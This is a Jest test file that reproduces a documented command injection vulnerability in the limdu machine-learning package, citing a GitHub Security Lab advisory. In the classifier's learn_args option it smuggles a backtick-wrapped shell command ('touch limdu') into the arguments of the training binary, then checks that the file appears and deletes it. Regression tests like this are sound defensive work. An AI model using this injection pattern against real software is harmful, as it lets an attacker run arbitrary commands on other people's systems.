// mkdir tmp
// ln -s `which echo` tmp/liblinear_train
// PATH=`pwd`/tmp/:$PATH

//https://securitylab.github.com/advisories/GHSL-2020-113-limdu/
test("Command Injection in limdu", () => {
  const limdu = require("limdu");
  const fs = require("fs");
  const path = "./limdu";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let classifier = new limdu.classifiers.EnhancedClassifier({
    classifierType: limdu.classifiers.multilabel.BinaryRelevance.bind(0, {
      binaryClassifierType: limdu.classifiers.SvmLinear.bind(0, {
        learn_args: "-c 20.0 `touch limdu`",
      }),
    }),
    featureExtractor: limdu.features.NGramsOfWords(1),
    featureLookupTable: new limdu.features.FeatureLookupTable(),
  });

  classifier.trainBatch([
    { input: "I want an apple", output: "apl" },
    { input: "I want a banana", output: "bnn" },
  ]);

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
